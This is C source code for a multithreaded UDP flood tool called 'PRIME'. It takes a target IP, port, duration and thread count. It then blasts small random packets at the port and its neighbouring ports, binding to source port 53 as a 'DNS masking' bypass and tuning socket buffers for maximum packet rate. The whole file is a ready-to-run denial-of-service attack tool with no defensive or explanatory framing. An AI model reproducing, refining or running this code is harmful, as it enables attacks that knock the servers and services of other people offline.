#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr, source_addr;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // ✨ BYPASS: Bind to Source Port 53 (DNS Masking)
    memset(&source_addr, 0, sizeof(source_addr));
    source_addr.sin_family = AF_INET;
    source_addr.sin_addr.s_addr = INADDR_ANY;
    source_addr.sin_port = htons(53); 
    bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));

    // ✨ KERNEL TUNING: 4MB Send Buffer
    int buf_size = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char payload[64]; // Small size = High PPS (Packets Per Second)
    for (int i = 0; i < 64; i++) payload[i] = (char)(rand() % 255);

    time_t end_time = time(NULL) + data->duration;
    unsigned long int packet_count = 0;

    while (1) {
        if (packet_count % 10000 == 0) {
            if (time(NULL) >= end_time) break;
        }

        // Port Spray Logic: Target ke padosi ports hit karo
        for (int p_off = -1; p_off <= 1; p_off++) {
            server_addr.sin_port = htons(data->port + p_off);
            sendto(sock, payload, 64, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
        packet_count++;
    }

    close(sock);
    free(data); 
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: ./PRIME <ip> <port> <time> <threads>\n");
        return 1;
    }

    int threads_count = atoi(argv[4]);
    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
    srand(time(NULL));

    for (int i = 0; i < threads_count; i++) {
        struct thread_data *t_data = malloc(sizeof(struct thread_data));
        strncpy(t_data->ip, argv[1], 15);
        t_data->port = atoi(argv[2]);
        t_data->duration = atoi(argv[3]);
        pthread_create(&thread_id[i], NULL, prime_strike, (void *)t_data);
    }

    for (int i = 0; i < threads_count; i++) pthread_join(thread_id[i], NULL);
    free(thread_id);
    return 0;
}
